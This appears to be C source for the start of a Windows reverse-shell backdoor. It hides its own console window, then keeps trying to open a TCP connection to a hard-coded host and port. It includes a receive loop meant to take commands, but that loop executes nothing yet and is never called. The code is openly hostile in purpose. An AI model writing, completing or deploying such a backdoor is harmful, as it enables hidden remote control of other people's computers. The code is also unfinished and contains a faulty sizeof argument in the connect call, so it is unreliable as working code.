#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

void Shell() {
	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while (1) {
		jump:
			bzero(buffer, sizeof(buffer));
			bzero(container, sizeof(container));	
			bzero(total_response, sizeof(total_response));

			recv(sock, buffer, 1024, 0);
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindow", NULL);

	ShowWindow(stealth, 0);

	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIp;
	WSADATA wsaData;

	ServIp = "192.168.1.1";
	ServPort = 50005;
	
	if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1);	
	}
	
	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIp);
	ServAddr.sin_port = htons(ServPort);
	
start:
	while(connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr != 0))) {
		Sleep(10);
		goto start;
	}
}

